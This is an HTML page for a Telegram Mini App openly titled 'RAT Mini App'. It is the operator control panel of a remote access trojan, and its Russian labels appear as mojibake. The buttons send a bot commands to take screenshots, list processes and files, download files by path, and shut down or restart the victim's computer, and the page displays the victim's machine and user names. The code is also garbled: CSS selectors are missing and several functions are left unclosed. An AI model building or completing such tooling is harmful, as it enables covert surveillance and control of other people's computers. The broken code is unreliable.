<!DOCTYPE html>
<html>
<head>
    <title>RAT Mini App</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {

            background: #f5f5f5;
            margin: 0;

            margin-bottom: 12px;

        }

            padding: 12px 20px;
            font-size: 16px;
            width: 100%;
            margin-bottom: 8px;
            cursor: pointer;
        }
        button.secondary {
            background: #f0f0f0;
            color: #333;
        }
        .status {
            padding: 10px;
            border-radius: 8px;
            margin-top: 10px;
            display: none;
        }
        .success {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
    </style>
</head>
<body>
    <div class="card">

        <p>–ö–æ–º–ø—å—é—Ç–µ—Ä: <span id="pc-name">–∑–∞–≥—Ä—É–∑–∫–∞...</span></p>
        <p>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: <span id="username">–∑–∞–≥—Ä—É–∑–∫–∞...</span></p>
    </div>

    <div class="card">
        <h3>üìä –°–ò–°–¢–ï–ú–ê</h3>
        <button onclick="sendCommand('info')">üñ•Ô∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö</button>
        <button onclick="sendCommand('screen')">üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç</button>
        <button onclick="sendCommand('processes')">üìã –ü—Ä–æ—Ü–µ—Å—Å—ã</button>
    </div>

    <div class="card">
        <h3>üìÅ –§–ê–ô–õ–´</h3>
        <button onclick="sendCommand('ls')">üìÇ –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤</button>
        <div style="display: flex; gap: 8px;">
            <input type="text" id="filePath" placeholder="–ø—É—Ç—å –∫ —Ñ–∞–π–ª—É" style="flex: 1; padding: 8px; border-radius: 6px; border: 1px solid #ddd;">
            <button onclick="downloadFile()" class="secondary">üì• –°–∫–∞—á–∞—Ç—å</button>
        </div>
    </div>

    <div class="card">
        <h3>‚ö° –£–ü–†–ê–í–õ–ï–ù–ò–ï</h3>
        <button onclick="sendCommand('shutdown')" style="background: #dc3545;">‚èª –í—ã–∫–ª—é—á–∏—Ç—å</button>
        <button onclick="sendCommand('restart')" style="background: #ffc107; color: #333;">üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å</button>
    </div>

    <div id="status" class="status"></div>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // –†–∞–∑–≤–æ—Ä–∞—á–∏–≤–∞–µ–º –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        document.getElementById('pc-name').textContent = '–∑–∞–≥—Ä—É–∑–∫–∞...';
        document.getElementById('username').textContent = tg.initDataUnsafe?.user?.username || 'Unknown';

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã –±–æ—Ç—É
        function sendCommand(cmd, param = '') {
            const statusDiv = document.getElementById('status');
            statusDiv.className = 'status';
            statusDiv.style.display = 'block';
            statusDiv.textContent = '‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞...';
            
            const fullCmd = param ? `${cmd} ${param}` : cmd;
            
            tg.sendData(JSON.stringify({
                command: fullCmd
            }));
        }

        // –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
        function downloadFile() {
            const path = document.getElementById('filePath').value;
            if (path) {

        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–≤–µ—Ç–∞ –æ—Ç –±–æ—Ç–∞
        tg.onEvent('mainButtonClicked', function() {

        // –ï—Å–ª–∏ –±–æ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –æ—Ç–≤–µ—Ç, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º
        tg.onEvent('popupOpened', function() {

    </script>

</html>
